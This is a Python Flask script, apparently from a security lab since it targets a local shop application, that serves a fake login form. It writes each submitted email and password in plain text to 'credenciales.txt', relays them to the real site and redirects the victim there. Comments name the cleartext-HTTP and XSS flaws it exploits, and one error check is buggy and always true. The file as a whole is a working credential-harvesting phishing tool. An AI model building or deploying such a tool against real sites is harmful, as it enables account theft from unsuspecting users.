import requests
from flask import Flask, render_template, request, redirect, url_for
from bs4 import BeautifulSoup

app = Flask(__name__)

# vulnerabilidad de transmisión en claro: el tráfico entre el formulario falso y el servidor real se está enviando a través de HTTP

# vulnerabilidad XSS: el formulario de comentarios no valida ni sanitiza correctamente los datos proporcionados por el usuario.
# El atacante puede inyectar código JavaScript 

# Ruta para mostrar el formulario HTML y procesar la solicitud POST
@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        # Procesa los datos del formulario
        email = request.form.get('email')
        password = request.form.get('password')
        
        # Guardar las credenciales en un archivo de texto
        with open('credenciales.txt', 'a') as file:
            file.write(f"Email: {email}, Password: {password}\n")
        
        login_data = {'email': email, 'password': password}
        login_url = 'http://localhost:8888/login'  # URL de la aplicación real
        
        # Enviar la solicitud POST al servidor real
        response = requests.post(login_url, data=login_data)
            
        # Analiza la respuesta HTML usando BeautifulSoup
        soup = BeautifulSoup(response.text, 'html.parser')

        # Busca el mensaje de error dentro de la respuesta
        error_message = soup.find('div', {'class': 'alert alert-danger'})

        # Si se encuentra el mensaje de error, verifica el texto
        if error_message:
            error_text = error_message.get_text().strip()
            print(f"Error text: '{error_text}'")
            # Verifica si el error es sobre el usuario inexistente o la contraseña incorrecta
            if "does not exist" in error_text or "User or password is invalid" or "Invalid password for user" in error_text:
                return redirect('http://127.0.0.1:8000/')
            
        # Si el inicio de sesión es exitoso, redirige al usuario a la página de pedidos
        if response.status_code == 200 or response.status_code == 302 :
            return redirect('http://localhost:8888/orders')  # Redirigir a la aplicación real

        else:
            # Si el inicio de sesión falla -> login
            return redirect('http://localhost:8888/')
        
    return render_template('loginexploit.html')  # Cargar el formulario falso

# Rutas para manejar redirecciones de las demás páginas
@app.route('/home')
def home():
    return redirect('http://localhost:8888/')  # Redirige a la página de inicio

@app.route('/products')
def products():
    return redirect('http://localhost:8888/products')  # Redirige a la página de productos

@app.route('/cart')
def cart():
    return redirect('http://localhost:8888/cart')  # Redirige al carrito

@app.route('/registration')
def registration():
    return redirect('http://localhost:8888/registration')  # Redirige al registro

@app.route('/sendEmail')
def sendEmail():
    return redirect('http://localhost:8888/sendEmail')  # Redirige forget password

if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1', port=8000)
